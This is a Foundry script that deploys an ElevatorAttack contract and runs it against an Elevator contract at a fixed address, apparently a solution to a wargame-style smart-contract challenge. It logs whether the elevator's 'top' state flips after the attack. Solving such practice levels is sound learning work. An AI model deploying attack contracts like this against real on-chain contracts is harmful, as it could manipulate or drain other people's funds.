// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {ElevatorAttack} from "../src/attacks/ElevatorAttack.sol";
import {Elevator} from "../src/levels/Elevator.sol";

contract ElevatorScript is Script {
    Elevator elevator = Elevator(payable(0x23Ee67158ce974C6f6c90c9c67F44A79b3704DB9));
    ElevatorAttack attacker;

    function run() external {
	vm.startBroadcast();
	attacker = new ElevatorAttack();
	console.log("ElevatorAttack Contract deployed to:", address(attacker));
	console.log("Elevator Contract top reached?", elevator.top());
	console.log("Attacking...");
	attacker.attack(address(elevator));
	console.log("Elevator Contract top reached?", elevator.top());
	vm.stopBroadcast();
    }
}
